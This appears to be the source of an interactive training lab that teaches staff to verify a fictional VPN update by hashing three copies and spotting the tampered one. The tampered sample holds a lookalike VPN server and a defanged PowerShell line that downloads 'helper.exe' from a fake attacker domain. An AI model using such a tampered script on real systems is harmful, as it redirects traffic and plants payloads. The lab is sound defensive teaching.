"use client";

import { useMemo } from "react";
import { RotateCcw } from "lucide-react";
import {
  Deck,
  DownloadButton,
  Hash,
  HashCompare,
  HashPlayground,
  HashTool,
  normHash,
  Options,
  Stepper,
  useDeck,
  useHashes,
  useSaved,
  Verdict,
  type DotStatus,
} from "./lab-kit";

// Week 2 lab: three copies of one IT update, one of them tampered with.
// Students hash every copy with a real tool, compare against the hash IT
// published, find what changed, and decide what to do. The files are plain
// text and the planted download address is defanged, so nothing here runs.

const HEADER = [
  "# PurveX Academy training file. This is not a real update. Do not run it.",
  "# PurveX Financial VPN profile update 2.4.1",
  "# Published by IT (Alex Rivera) on the IT portal. Staff laptops only.",
];
const GENUINE = [
  ...HEADER,
  '$Profile = "PurveX VPN"',
  '$Server  = "vpn.purvexfinancial.com"',
  "Set-VpnConnection -Name $Profile -ServerAddress $Server -SplitTunneling $false -Force",
  'Write-Host "PurveX VPN profile updated to 2.4.1"',
];
// Line 5 points the VPN at a lookalike domain (a digit 1 for the letter l),
// and line 7 is new: it pulls a program onto the laptop.
const TAMPERED = [
  ...HEADER,
  '$Profile = "PurveX VPN"',
  '$Server  = "vpn.purvexfinancia1.com"',
  "Set-VpnConnection -Name $Profile -ServerAddress $Server -SplitTunneling $false -Force",
  'Invoke-WebRequest "hxxps://purvexfinancia1[.]com/helper" -OutFile "$env:TEMP\\helper.exe"',
  'Write-Host "PurveX VPN profile updated to 2.4.1"',
];
const CHANGED_LINES = [4, 6];
const text = (lines: string[]) => lines.join("\n") + "\n";

interface Copy {
  id: string;
  tag: string;
  title: string;
  from: string;
  story: string;
  file: string;
  body: string;
  genuine: boolean;
  why: string;
}

const COPIES: Copy[] = [
  {
    id: "email",
    tag: "A",
    title: "Email attachment",
    from: "Alex Rivera, IT",
    story: "Alex emailed the update to all staff at 8:02 this morning with the subject VPN update 2.4.1, please install today.",
    file: "vpn-update-email.txt",
    body: text(GENUINE),
    genuine: true,
    why: "Its hash matches the one IT published, character for character. This copy is exactly what IT released.",
  },
  {
    id: "share",
    tag: "B",
    title: "Shared drive",
    from: "\\\\fs01\\IT\\Updates",
    story: "Most staff grab updates from the IT share. The file there was last modified at 2:47 this morning, five hours before Alex sent the email.",
    file: "vpn-update-share.txt",
    body: text(TAMPERED),
    genuine: false,
    why: "One changed character anywhere in a file gives a completely different hash. This copy is not what IT released, and the timestamp says someone replaced it overnight.",
  },
  {
    id: "teams",
    tag: "C",
    title: "Teams message",
    from: "PurveX IT Support (external account)",
    story: "A Teams chat from an account outside the company, named PurveX IT Support, sent a download link and wrote: install ASAP, VPN changes tonight.",
    file: "vpn-update-teams.txt",
    body: text(GENUINE),
    genuine: true,
    why: "Its hash matches, so the file itself is untouched. The message is still a red flag: IT does not send updates from outside accounts.",
  },
];
const BY_ID = Object.fromEntries(COPIES.map((c) => [c.id, c])) as Record<string, Copy>;

const EFFECT = [
  { key: "typo", text: "Nothing. It is a typo that would make the VPN fail to connect." },
  { key: "redirect", text: "Send the laptop's VPN traffic to an outside server and download a program onto the laptop." },
  { key: "delete", text: "Delete the files in the user's Temp folder." },
];

const QUESTIONS: { id: string; tag: string; title: string; prompt: string; options: { key: string; text: string }[]; answer: string; why: string }[] = [
  {
    id: "first",
    tag: "1",
    title: "Copy B",
    prompt: "Copy B is on the share every department uses. What do you do first?",
    options: [
      { key: "delete", text: "Delete it from the share and replace it with the good copy. Problem solved." },
      { key: "test", text: "Run it on a spare laptop to see what it actually does." },
      { key: "contain", text: "Pull it from the share, keep a copy as evidence, warn staff not to run it, and escalate to security with the hashes." },
      { key: "rehash", text: "Hash it again. The first hash was probably wrong." },
    ],
    answer: "contain",
    why: "Someone with write access to the IT share replaced an update at 2:47 in the morning. That is an incident, not a file cleanup. Deleting it destroys the evidence, and running it does the attacker's job for them. Keep the file and its hash, stop anyone installing it, and hand it to security, who will also want to know who has already run it.",
  },
  {
    id: "teams",
    tag: "2",
    title: "Copy C",
    prompt: "Copy C matched IT's hash, but it came from an outside Teams account. Can staff use it?",
    options: [
      { key: "use", text: "Yes. The hash matched, so it is safe." },
      { key: "report", text: "Report the message as phishing and tell staff to get updates only from the IT portal." },
      { key: "ignore", text: "Ignore it. It matched, so no harm done." },
    ],
    answer: "report",
    why: "A matching hash proves this file is untouched. It says nothing about the sender. An outside account posing as IT is a classic pretext, and the next link it sends may not match. Report it, and point staff back to the one source IT controls.",
  },
  {
    id: "limits",
    tag: "3",
    title: "The limit",
    prompt: "In 2017, attackers slipped malware into CCleaner, and the poisoned installer was still signed by the vendor. Why would checking the hash not have caught it?",
    options: [
      { key: "type", text: "Hashes do not work on installers." },
      { key: "source", text: "The vendor's own build was poisoned, so the hash and signature it published belonged to the bad file." },
      { key: "users", text: "Nobody knew how to hash a file." },
    ],
    answer: "source",
    why: "A hash only proves a file matches the reference you compare it to. If the attacker gets inside the place the reference comes from, the bad file and the published hash match perfectly. The same happened with SolarWinds in 2020. Hashing checks integrity. Trusting the source is a separate question.",
  },
];

const STEPS = ["Hash every copy", "Find the change", "Make the call", "Debrief"];

interface State {
  step: number;
  pasted: Record<string, string>;
  verdict: Record<string, "match" | "nomatch">;
  lines: number[];
  effect?: string;
  answers: Record<string, string>;
  checked: [boolean, boolean, boolean];
}
const START: State = { step: 0, pasted: {}, verdict: {}, lines: [], answers: {}, checked: [false, false, false] };
const STORE = "academy-lab-hash-verify-v1";

export function HashVerifyLab() {
  const [s, setS] = useSaved<State>(STORE, START, (v) => Array.isArray(v.lines) && Array.isArray(v.checked));
  const hashes = useHashes({ official: text(GENUINE), ...Object.fromEntries(COPIES.map((c) => [c.id, c.body])) });
  const deck1 = useDeck(COPIES.length);
  const deck3 = useDeck(QUESTIONS.length);

  const patch = (p: Partial<State>) => setS((prev) => ({ ...prev, ...p }));
  const go = (step: number) => {
    patch({ step });
    deck1.reset();
    deck3.reset();
    document.querySelector(".rt")?.scrollIntoView({ block: "start", behavior: "smooth" });
  };
  const check = (i: 0 | 1 | 2) => setS((prev) => ({ ...prev, checked: prev.checked.map((c, j) => (j === i ? true : c)) as State["checked"] }));

  const hashOk = (id: string) => Boolean(hashes[id]) && normHash(s.pasted[id] ?? "") === hashes[id];
  const truth = (c: Copy) => (c.genuine ? "match" : "nomatch");

  const score = useMemo(() => {
    const matched = COPIES.filter((c) => s.verdict[c.id] === truth(c)).length;
    const linesRight = s.lines.length === CHANGED_LINES.length && CHANGED_LINES.every((l) => s.lines.includes(l)) ? 1 : 0;
    const effect = s.effect === "redirect" ? 1 : 0;
    const calls = QUESTIONS.filter((q) => s.answers[q.id] === q.answer).length;
    return { matched, find: linesRight + effect, calls, total: matched + linesRight + effect + calls };
  }, [s]);

  const allHashed = COPIES.every((c) => hashOk(c.id) && s.verdict[c.id]);
  const reached = [true, s.checked[0], s.checked[1], s.checked[2]];

  return (
    <section className="rt" aria-label="The Update Nobody Can Vouch For lab">
      <Stepper steps={STEPS} step={s.step} done={[...s.checked, false]} reached={reached} onGo={go} />

      {s.step === 0 && (
        <div className="rt-body">
          <header className="rt-head">
            <h3>Which copies are real?</h3>
            <p>
              IT published one hash for this update on the IT portal. Download each copy, hash it yourself, paste the hash you get, then say whether it matches. Do not trust how the file looks. Trust the hash.
            </p>
          </header>
          <div className="lk-real">
            <b>Published on the IT portal by Alex Rivera</b>
            <p>VPN update 2.4.1. SHA-256:</p>
            <Hash value={hashes.official} />
          </div>
          <HashPlayground seed="PurveX VPN update 2.4.1" />
          <HashTool mode="file" />
          <Deck
            tags={COPIES.map((c) => c.tag)}
            titles={COPIES.map((c) => c.title)}
            index={deck1.card}
            dir={deck1.dir}
            onGo={deck1.show}
            status={COPIES.map((c): DotStatus => (s.checked[0] ? (s.verdict[c.id] === truth(c) ? "right" : "wrong") : hashOk(c.id) && s.verdict[c.id] ? "answered" : "open"))}
          >
            {(() => {
              const c = COPIES[deck1.card];
              const done = s.checked[0];
              const pasted = s.pasted[c.id] ?? "";
              const ok = hashOk(c.id);
              const right = s.verdict[c.id] === truth(c);
              return (
                <div className={`rt-ticket${done ? (right ? " is-right" : " is-wrong") : ""}`}>
                  <div className="rt-ticket__head">
                    <span className="rt-tag">{c.tag}</span>
                    <div>
                      <b>{c.title}</b>
                      <small>From {c.from}</small>
                      <p>{c.story}</p>
                    </div>
                  </div>
                  <div>
                    <DownloadButton name={c.file} text={c.body} />
                  </div>
                  <label className="lk-field">
                    Paste the SHA-256 you got for {c.file}
                    <div>
                      <input
                        type="text"
                        value={pasted}
                        disabled={done}
                        spellCheck={false}
                        autoComplete="off"
                        placeholder="64 characters, 0 to 9 and a to f"
                        onChange={(e) => patch({ pasted: { ...s.pasted, [c.id]: e.target.value } })}
                      />
                    </div>
                  </label>
                  {pasted && !ok && (
                    <p className="lk-note is-bad">
                      {normHash(pasted).length !== 64 ? "A SHA-256 is 64 characters long. Copy the whole value." : "That is not this file's hash. Hash the file you downloaded for this copy."}
                    </p>
                  )}
                  {ok && (
                    <>
                      <p className="lk-note is-good">That is this file&apos;s hash. Now line it up against the one IT published.</p>
                      <HashCompare label={`Copy ${c.tag}`} mine={pasted} reference={hashes.official} />
                      <div className="rt-choice" role="radiogroup" aria-label={`Does copy ${c.tag} match?`} style={{ gridTemplateColumns: "repeat(2, minmax(0, 1fr))" }}>
                        {(["match", "nomatch"] as const).map((v) => (
                          <button
                            key={v}
                            type="button"
                            role="radio"
                            aria-checked={s.verdict[c.id] === v}
                            disabled={done}
                            className={done && v === truth(c) ? "is-answer" : ""}
                            onClick={() => {
                              const verdict = { ...s.verdict, [c.id]: v };
                              patch({ verdict });
                              deck1.next((i) => hashOk(COPIES[i].id) && Boolean(verdict[COPIES[i].id]));
                            }}
                          >
                            <b>{v === "match" ? "Matches" : "Does not match"}</b>
                          </button>
                        ))}
                      </div>
                    </>
                  )}
                  {done && <Verdict right={right}>{c.why}</Verdict>}
                </div>
              );
            })()}
          </Deck>
          <footer className="rt-foot">
            {s.checked[0] ? (
              <>
                <p className="rt-tally">
                  <b>{score.matched} of 3</b> called correctly
                </p>
                <button type="button" className="rt-btn rt-btn--primary" onClick={() => go(1)}>
                  Find the change
                </button>
              </>
            ) : (
              <>
                <p className="rt-tally">{COPIES.filter((c) => hashOk(c.id) && s.verdict[c.id]).length} of 3 hashed and compared</p>
                <button type="button" className="rt-btn rt-btn--primary" disabled={!allHashed} onClick={() => check(0)}>
                  Check answers
                </button>
              </>
            )}
          </footer>
        </div>
      )}

      {s.step === 1 && (
        <div className="rt-body">
          <header className="rt-head">
            <h3>What did they change?</h3>
            <p>
              The hash told you copy B is different. It cannot tell you how. Read copy B and click every line that is not in the update IT released. Look closely. Attackers change as little as they can.
            </p>
          </header>
          <FileView
            name={BY_ID.share.file}
            lines={TAMPERED}
            picked={s.lines}
            reveal={s.checked[1]}
            onToggle={(n) => patch({ lines: s.lines.includes(n) ? s.lines.filter((x) => x !== n) : [...s.lines, n] })}
          />
          <div className="lk-q">
            <b>If a user had run copy B, what would it have done?</b>
            <Options label="What copy B does" options={EFFECT} value={s.effect} answer={s.checked[1] ? "redirect" : undefined} disabled={s.checked[1]} onPick={(effect) => patch({ effect })} />
          </div>
          {s.checked[1] && (
            <div className="rt-why">
              <Verdict right={score.find === 2}>
                Line 5 swaps the lowercase l in purvexfinancial for the digit 1, so the VPN would connect to a server the attacker owns. Line 7 is new and downloads a program to the laptop. The file looks almost identical, which is why you check the hash instead of eyeballing it.
              </Verdict>
            </div>
          )}
          <footer className="rt-foot">
            {s.checked[1] ? (
              <>
                <p className="rt-tally">
                  <b>{score.find} of 2</b> right
                </p>
                <button type="button" className="rt-btn rt-btn--primary" onClick={() => go(2)}>
                  Make the call
                </button>
              </>
            ) : (
              <>
                <p className="rt-tally">{s.lines.length ? `${s.lines.length} line${s.lines.length > 1 ? "s" : ""} picked` : "Click the lines that changed"}</p>
                <button type="button" className="rt-btn rt-btn--primary" disabled={!s.lines.length || !s.effect} onClick={() => check(1)}>
                  Check answers
                </button>
              </>
            )}
          </footer>
        </div>
      )}

      {s.step === 2 && (
        <div className="rt-body">
          <header className="rt-head">
            <h3>What happens next?</h3>
            <p>You found a tampered update on the share every department uses. Three calls to make.</p>
          </header>
          <Deck
            tags={QUESTIONS.map((q) => q.tag)}
            titles={QUESTIONS.map((q) => q.title)}
            index={deck3.card}
            dir={deck3.dir}
            onGo={deck3.show}
            status={QUESTIONS.map((q): DotStatus => (s.checked[2] ? (s.answers[q.id] === q.answer ? "right" : "wrong") : s.answers[q.id] ? "answered" : "open"))}
          >
            {(() => {
              const q = QUESTIONS[deck3.card];
              const done = s.checked[2];
              const right = s.answers[q.id] === q.answer;
              return (
                <div className={`rt-ticket${done ? (right ? " is-right" : " is-wrong") : ""}`}>
                  <div className="lk-q">
                    <b>{q.prompt}</b>
                    <Options
                      label={q.title}
                      options={q.options}
                      value={s.answers[q.id]}
                      answer={done ? q.answer : undefined}
                      disabled={done}
                      onPick={(v) => {
                        const answers = { ...s.answers, [q.id]: v };
                        patch({ answers });
                        deck3.next((i) => Boolean(answers[QUESTIONS[i].id]));
                      }}
                    />
                  </div>
                  {done && <Verdict right={right}>{q.why}</Verdict>}
                </div>
              );
            })()}
          </Deck>
          <footer className="rt-foot">
            {s.checked[2] ? (
              <>
                <p className="rt-tally">
                  <b>{score.calls} of 3</b> right
                </p>
                <button type="button" className="rt-btn rt-btn--primary" onClick={() => go(3)}>
                  See the debrief
                </button>
              </>
            ) : (
              <>
                <p className="rt-tally">{QUESTIONS.filter((q) => s.answers[q.id]).length} of 3 answered</p>
                <button type="button" className="rt-btn rt-btn--primary" disabled={QUESTIONS.some((q) => !s.answers[q.id])} onClick={() => check(2)}>
                  Check answers
                </button>
              </>
            )}
          </footer>
        </div>
      )}

      {s.step === 3 && (
        <div className="rt-body">
          <header className="rt-head rt-head--result">
            <div className={`rt-grade rt-grade--${score.total >= 7 ? "high" : score.total >= 5 ? "medium" : "low"}`}>
              <b>{score.total}</b>
              <small>of 8</small>
            </div>
            <div>
              <h3>{score.total >= 7 ? "You would catch this one" : score.total >= 5 ? "Solid start" : "Worth another pass"}</h3>
              <p>
                Hashed {score.matched} of 3 · Found {score.find} of 2 · Called {score.calls} of 3
              </p>
            </div>
          </header>
          <p className="rt-lesson">
            A hash is a fingerprint. Change one character and the whole fingerprint changes, and you cannot turn a fingerprint back into the file. That is why a hash proves a file was not changed, but keeps nothing secret. Keeping a
            file secret is encryption, which is reversible with the right key.
          </p>
          <div className="lk-real">
            <b>On the job</b>
            <p>
              Analysts hash suspicious files with Get-FileHash, certutil, sha256sum or CyberChef, then search the hash in threat intelligence tools such as VirusTotal to see if anyone has seen that exact file before. The hash goes in the
              ticket, so everyone talks about the same file.
            </p>
          </div>
          <div className="lk-real">
            <b>It happened for real</b>
            <p>
              CCleaner (2017) and SolarWinds (2020) shipped poisoned updates from the vendor&apos;s own build systems, signed and published as genuine. Hashes still matter. They just prove a file matches its source, not that the source is
              safe.
            </p>
          </div>
          <footer className="rt-foot">
            <p className="rt-tally">Trust the hash from the source IT controls, and treat a changed file on a shared drive as an incident.</p>
            <button type="button" className="rt-btn" onClick={() => setS(START)}>
              <RotateCcw aria-hidden="true" /> Try again
            </button>
          </footer>
        </div>
      )}
    </section>
  );
}

function FileView({ name, lines, picked, reveal, onToggle }: { name: string; lines: string[]; picked: number[]; reveal: boolean; onToggle: (n: number) => void }) {
  return (
    <div className="lk-file">
      <div className="lk-file__bar">
        <span>{name}</span>
        <span>{reveal ? "Green: changed. Red: you picked it, but it matches IT's copy." : "Click a line to pick it"}</span>
      </div>
      <ol>
        {lines.map((line, n) => {
          const isPicked = picked.includes(n);
          const changed = CHANGED_LINES.includes(n);
          const cls = reveal ? (changed ? "is-changed" : isPicked ? "is-miss" : "") : isPicked ? "is-picked" : "";
          return (
            <li key={n}>
              <button type="button" className={cls} disabled={reveal} aria-pressed={isPicked} onClick={() => onToggle(n)}>
                <i>{n + 1}</i>
                <span>{line}</span>
              </button>
            </li>
          );
        })}
      </ol>
    </div>
  );
}
